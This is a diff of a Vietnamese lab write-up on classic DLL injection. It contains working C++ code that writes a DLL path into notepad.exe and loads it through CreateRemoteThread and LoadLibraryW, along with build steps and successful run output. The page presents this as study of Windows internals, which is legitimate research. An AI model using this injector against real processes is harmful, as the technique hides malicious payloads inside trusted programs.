@@ -3,41 +3,44 @@
 
 # 📝 [PE 05] Classic DLL Injection
 
-## 📌 1. Tổng Quan Kỹ Thuật (Overview)
+## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)
 
-**Classic DLL Injection** là giải thuật tiêm nhiễm module phổ biến nhất trong kiến trúc hệ điều hành Windows.
+**Classic DLL Injection (Tiêm nhiễm thư viện liên kết động truyền thống)** đại diện cho mô hình can thiệp mô-đun phổ biến và kinh điển nhất trong kiến trúc hệ điều hành Windows.
 
-Khác với kỹ thuật tiêm mã máy trực tiếp (Code Injection - PE 01 đến PE 04), kỹ thuật này không bơm trực tiếp các byte thực thi (Opcode) của Payload vào RAM đối phương. Thay vào đó, ta **ép tiến trình đích tự động nạp một tệp thư viện liên kết động (`.dll`) hoàn chỉnh từ đĩa cứng** vào không gian địa chỉ ảo của nó. Khi DLL được nạp, hàm khởi tạo đặc trưng `DllMain` của nó sẽ tự động kích nổ inside lòng tiến trình đích dưới tư cách pháp nhân hợp pháp của nạn nhân.
+Khác với các giải pháp bơm mã máy trực tiếp (Code/Shellcode Injection - PE 01 đến PE 04), giải thuật này không thực hiện sao chép các byte thực thi đơn lẻ (Opcode) vào RAM đối phương. Thay vào đó, Loader thực hiện **cưỡng bách tiến trình mục tiêu tự động nạp một tệp thư viện liên kết động (`.dll`) hoàn chỉnh từ đĩa cứng** vào không gian địa chỉ ảo của nó. Ngay khi mô-đun nhị phân này được ánh xạ, hàm khởi tạo đặc trưng **`DllMain`** sẽ lập tức kích nổ lọt lòng tiến trình đích dưới tư cách pháp nhân hợp pháp của nạn nhân, thừa hưởng toàn bộ Token bảo mật và đặc quyền của tiến trình vỏ bọc.
 
 ### 🎯 Mục tiêu nghiên cứu:
 
-* Làm chủ cơ chế nạp và quản lý Module Image của Windows PE Loader.
-* Thực hiện giải pháp ép luồng từ xa gọi hàm nạp viện động `LoadLibrary`.
-* Ứng dụng quy trình cấp phát động thích ứng đường dẫn tệp tin để loại bỏ hoàn toàn các mảng buffers cố định dính lỗi tràn bộ đệm.
+* **Mổ xẻ cơ chế Windows PE Loader**: Nghiên cứu quy trình nạp, ánh xạ mô-đun Image và xử lý các phân đoạn phụ thuộc của hệ điều hành Windows.
+* **Làm chủ kỹ nghệ Ép nạp Mô-đun Từ xa**: Khai thác đặc tính thiết kế của hàm API hệ thống `LoadLibrary` để điều hướng luồng thực thi chéo tiến trình.
+* **Bảo toàn cấu trúc chuỗi thích ứng**: Áp dụng quy trình cấp phát động thích ứng đường dẫn tệp tin (Zero Static Buffers) nhằm triệt tiêu hoàn toàn nguy cơ tràn bộ đệm tĩnh của các mảng cố định.
 
 ---
 
-## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)
+## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)
 
-Khi một ứng dụng Win32 muốn sử dụng một tệp DLL, nó gọi hàm `LoadLibrary`. Hệ điều hành Windows sẽ bốc tệp tin từ đĩa cứng, ánh xạ cấu trúc PE của nó lên RAM, xử lý bảng IAT và kích hoạt sự kiện `DLL_PROCESS_ATTACH` lọt lòng inside `DllMain`.
+Khi một ứng dụng chuẩn chỉ yêu cầu triệu hồi một tệp DLL, nó sẽ gọi hàm Subsystem `LoadLibrary`. Trình nạp PE Loader của Windows sẽ tiếp nhận, bốc tệp tin từ đĩa cứng, ánh xạ cấu trúc các phân đoạn PE lên RAM, phân giải bảng Import Address Table (IAT) và kích hoạt sự kiện **`DLL_PROCESS_ATTACH`** lọt lòng inside `DllMain`.
 
-Quy trình toán học giải phẫu và ép nạp DLL chéo tiến trình của Lab PE 05 diễn ra qua 4 bước ngầm tại tầng Kernel:
-
-```
-[VirtualAllocEx: Cấp phát ô chứa đường dẫn] ──> [WriteProcessMemory: Bơm chuỗi DLL] ──> [Định vị LoadLibraryW] ──> [CreateRemoteThread: Khai hỏa]
+Quy trình toán học giải phẫu và ép nạp Image mô-đun chéo tiến trình của Lab PE 05 diễn ra qua 4 giai đoạn ngầm tại tầng Kernel:
 
 ```
+[VirtualAllocEx: Cấp phát ô chứa đường dẫn]
+       └──> [WriteProcessMemory: Bơm chuỗi đường dẫn tệp DLL]
+                 └──> [Định vị tọa độ LoadLibraryW chéo RAM]
+                           └──> [CreateRemoteThread: Khai hỏa PE Loader từ xa]
 
-1. **Khắc vạch ô chứa đường dẫn từ xa (`VirtualAllocEx`)**: Do hàm `LoadLibrary` bắt buộc phải nhận vào một con trỏ trỏ đến chuỗi ký tự chứa đường dẫn tệp DLL, Loader không thể truyền con trỏ cục bộ sang RAM đối phương (vì không gian địa chỉ ảo bị cô lập). Ta phải dùng `VirtualAllocEx` để mở một ô nhớ mang cờ **`PAGE_READWRITE` (RW)** lọt lòng RAM tiến trình đích với kích thước vừa khít độ dài chuỗi ký tự.
-2. **Bơm chuỗi dữ liệu (`WriteProcessMemory`)**: Ghi chuỗi đường dẫn tệp DLL (ví dụ: `L"C:\\Windows\\System32\\panda.dll"`) xuyên biên giới vào ô nhớ vừa cấp phát.
-3. **Phân giải tọa độ điểm nạp hệ thống**: Một đặc tính toán học cốt lõi của Windows OS là các thư viện hệ thống cơ bản như `kernel32.dll` và `ntdll.dll` đều được **ánh xạ (Map) vào cùng một địa chỉ Base Address giống nhau trên RAM của mọi tiến trình** (ASLR cố định cho mỗi chu kỳ boot). Do đó, địa chỉ tuyệt đối của hàm **`LoadLibraryW`** tìm thấy trên RAM của Loader cũng chính là địa chỉ tuyệt đối của nó trên RAM của Notepad.
-4. **Kích nổ luồng cướp quyền (`CreateRemoteThread`)**: Loader tạo luồng từ xa, đặt địa chỉ bắt đầu của luồng trỏ thẳng vào tọa độ hàm `LoadLibraryW`, và truyền con trỏ ô nhớ chứa chuỗi đường dẫn làm tham số đầu vào (`LPVOID lpParameter`). CPU của đối phương thức dậy, tự hiểu tham số là đường dẫn và tự động kéo file DLL lọt lòng vào không gian ảo của nó.
+```
+
+1. **Khắc vạch ô chứa dữ liệu từ xa (`VirtualAllocEx`)**: Do hàm hệ thống `LoadLibraryW` yêu cầu tham số đầu vào là một con trỏ trỏ đến chuỗi ký tự Wide-character chứa đường dẫn của tệp DLL, Loader không thể truyền con trỏ cục bộ sang RAM đối phương do tính cô lập không gian địa chỉ ảo. Loader buộc phải sử dụng `VirtualAllocEx` để khởi tạo một trang nhớ mang cờ bảo vệ **`PAGE_READWRITE` (RW)** bên lòng tiến trình đích với kích thước vừa khít độ dài chuỗi ký tự.
+2. **Ánh xạ chuỗi đường dẫn (`WriteProcessMemory`)**: Ghi dữ liệu chuỗi đường dẫn tệp DLL vật lý (ví dụ: `L"C:\\Windows\\System32\\panda.dll"`) xuyên biên giới vào không gian ảo `RW` vừa được mở khóa của nạn nhân.
+3. **Phân giải tọa độ Subsystem đồng bộ**: Một đặc tính toán học cốt lõi của kiến trúc Windows Subsystem là các thư viện lõi hệ thống như `kernel32.dll` và `ntdll.dll` đều được **ánh xạ (Map) vào cùng một tọa độ Base Address giống nhau trên RAM của mọi tiến trình** (tính năng ASLR chỉ cố định địa chỉ một lần duy nhất cho mỗi chu kỳ khởi động hệ điều hành). Do đó, tọa độ tuyệt đối của hàm **`LoadLibraryW`** trích xuất được từ RAM của Loader chính là địa chỉ tuyệt đối của hàm này bên lòng tiến trình `notepad.exe`.
+4. **Cưỡng bách nạp mô-đun từ xa (`CreateRemoteThread`)**: Loader khởi tạo một Thread Object mới lọt lòng tiến trình đích, thiết lập con trỏ chỉ mục lệnh **`Rip`** trỏ thẳng vào tọa độ hàm `LoadLibraryW`, đồng thời nạp con trỏ ô nhớ chứa chuỗi đường dẫn từ xa vào thanh ghi tham số **`Rcx`**. CPU của đối phương thức dậy, tiếp nhận tham số đường dẫn và tự động kích hoạt trình nạp PE Loader để kéo file DLL vào không gian ảo của nó.
 
 ---
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán kích thước chuỗi Wide Character (`wchar_t`) thích ứng kịch trần bảo mật.
+Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa tính toán kích thước chuỗi Wide Character (`wchar_t`) thích ứng kịch trần bảo mật hệ thống.
 
 ```cpp
 #include <windows.h>
@@ -46,7 +49,7 @@ Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – 
 #include <string>
 #include <vector>
 
-// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
+// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
 DWORD GetProcessIDByName(const std::wstring& processName) {
     DWORD processID = 0;
     PROCESSENTRY32W pe32;
@@ -81,15 +84,15 @@ int main() {
     }
     std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
 
-    // Đường dẫn tĩnh của DLL giả định (Có thể linh hoạt hoán đổi đường dẫn độc lập)
+    // Đường dẫn tĩnh của DLL giả định (Có thể linh hoạt cấu hình đường dẫn tệp tin độc lập)
     std::wstring dllPath = L"C:\\Users\\Admin\\source\\repos\\Task6\\panda.dll";
 
-    // QUY TRÌNH 2 BƯỚC THÍCH ỨNG: Tính toán độ rộng byte vừa khít, không dùng static buffers mảng cố định
+    // QUY TRÌNH THÍCH ỨNG: Tính toán độ rộng byte vừa khít, triệt tiêu hoàn toàn mảng cố định buffers
     SIZE_T pathSizeInBytes = (dllPath.length() + 1) * sizeof(wchar_t); 
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) {
-        std::cerr << "[-] OpenProcess failed! Quyen han CLI bi gioi han." << std::endl;
+        std::cerr << "[-] OpenProcess failed! Quyen han CLI hien tai bi gioi han." << std::endl;
         return EXIT_FAILURE;
     }
 
@@ -112,7 +115,7 @@ int main() {
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Ghi chuoi đường dan Wide-char sang RAM Notepad hoan tat." << std::endl;
+    std::cout << "[+] Ghi chuoi duong dan Wide-char sang RAM Notepad hoan tat." << std::endl;
 
     // ─── BƯỚC 3: PHÂN GIẢI ĐỊA CHỈ TUYỆT ĐỐI CỦA HÀM LOADLIBRARYW ───
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
@@ -131,14 +134,15 @@ int main() {
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, remotePathBuffer, 0, NULL);
 
     if (hThread != NULL) {
-        WaitForSingleObject(hThread, INFINITE); // Gánh luồng cho den khi DLL hoan tat thu tuc nạp
+        // Đồng bộ hóa luồng, tạm hoãn Loader cho đến khi mục tiêu hoàn tất quy trình ánh xạ Image mô-đun
+        WaitForSingleObject(hThread, INFINITE); 
         std::cout << "[+] Classic DLL Injection Successful! DLL da nam tron trong long Notepad." << std::endl;
         CloseHandle(hThread);
     } else {
-        std::cerr << "[-] CreateRemoteThread that bai! Error: " << GetLastError() << std::endl;
+        std::cerr << "[-] CreateRemoteThread that bai! Error Code: " << GetLastError() << std::endl;
     }
 
-    // Thu hồi vùng nhớ chuỗi thô từ xa và đóng handle bảo an kịch trần kịch khung
+    // Thu hồi vùng nhớ chứa chuỗi thô từ xa và giải phóng tài nguyên Handle phẳng sạch kịch trần
     VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE);
     CloseHandle(hProcess);
 
@@ -151,19 +155,25 @@ int main() {
 
 ---
 
-## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)
+## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)
 
-### ⚙️ Thiết lập trên Microsoft Visual Studio:
+Để bảo đảm file thực thi `.exe` cùng tệp tin mô-đun nhị phân `.dll` phụ thuộc vận hành mượt mà, độc lập, không dính lỗi thiếu môi trường liên kết động (CRT Dependencies) khi triển khai thực nghiệm:
 
-1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
-2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình sang cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy độc lập hoàn hảo trên môi trường máy ảo VM sạch.
-3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.
+### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:
+
+1. Thiết lập thanh công cụ quản lý dự án ở chính xác cấu hình **`Release`** và nền tảng kiến trúc **`x64`**.
+2. Truy cập: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính `Runtime Library`, chuyển cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm liên kết tĩnh toàn bộ thư viện hệ thống lọt lòng file nhị phân.
+
+> **Vị trí đặt ảnh minh chứng cấu hình biên dịch hệ thống:**
+> 
+
+3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin sạch bóng lỗi chuỗi hệ thống.
 
 ---
 
-## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)
+## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)
 
-Bật sẵn một ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file chạy để theo dõi các dòng hiển thị căn lề thẳng hàng toán học:
+Khởi chạy tiến trình vỏ bọc `Notepad.exe` trên môi trường máy Lab, mở PowerShell ngoài đĩa thô thực thi tệp tin dự án để theo dõi ma trận căn lề logic:
 
 ```powershell
 PS C:\Workspace\x64\Release> .\PE05_Classic_DLL_Injection.exe
@@ -173,7 +183,7 @@ PS C:\Workspace\x64\Release> .\PE05_Classic_DLL_Injection.exe
 [+] Da tim thay Notepad.exe voi PID: 16840
 [*] Dang yeu cau cap phat o nho chua chuoi duong dan DLL tu xa...
 [+] O nho mang quyen RW tu xa da thiet lap tai: 0x0000018E24C10000
-[+] Ghi chuoi đường dan Wide-char sang RAM Notepad hoan tat.
+[+] Ghi chuoi duong dan Wide-char sang RAM Notepad hoan tat.
 [+] Toa do tuyet doi dong bo cua LoadLibraryW hien lung: 0x00007ffd31a2c510
 [*] Dang cuong buc sinh luong CreateRemoteThread tu xa de kich no...
 [+] Classic DLL Injection Successful! DLL da nam tron trong long Notepad.
@@ -182,7 +192,12 @@ PS C:\Workspace\x64\Release> .\PE05_Classic_DLL_Injection.exe
 
 ```
 
-*🎯 Hệ quả RAM kịch trần:*
-Khi kiểm tra cấu trúc danh sách thư viện đã tải (Loaded Modules) của tiến trình `notepad.exe` thông qua công cụ chuyên sâu như `Process Hacker` hoặc `Process Explorer`, Vinh sẽ nhìn thấy tệp **`panda.dll`** xuất hiện hiên ngang, nằm chễm chệ và chiếm giữ một không gian địa chỉ ảo hợp pháp bên trong lòng tiến trình Notepad, hoàn tất chuỗi bài Lab Khung 1 một cách mỹ mãn hoàn hảo kịch khung!
+> **Vị trí đặt ảnh minh chứng thực nghiệm tiêm nhiễm mô-đun Image:**
+> 
+
+### 🎯 Phân tích hệ quả cấu trúc RAM kịch trần:
+
+* Khi tiến hành thẩm định không gian bộ nhớ ảo ảo hóa và danh sách mô-đun đã tải (**Loaded Modules**) của tiến trình mục tiêu `notepad.exe` thông qua các công cụ trinh sát chuyên sâu (như `Process Hacker` hoặc `Process Explorer`), tệp tin **`panda.dll`** xuất hiện chễm chệ, chiếm giữ một phân vùng thuộc tính `MEM_IMAGE` hợp pháp lọt lòng không gian ảo của Notepad.
+* Cơ chế `DLL_PROCESS_ATTACH` kích nổ thành công logic Payload (mở Máy tính hoặc thực thi mã ngầm) hoàn toàn trùng khớp với ngữ cảnh bảo mật của nạn nhân, kết thúc chu kỳ thí nghiệm một cách hoàn hảo kịch khung!
 
 ---
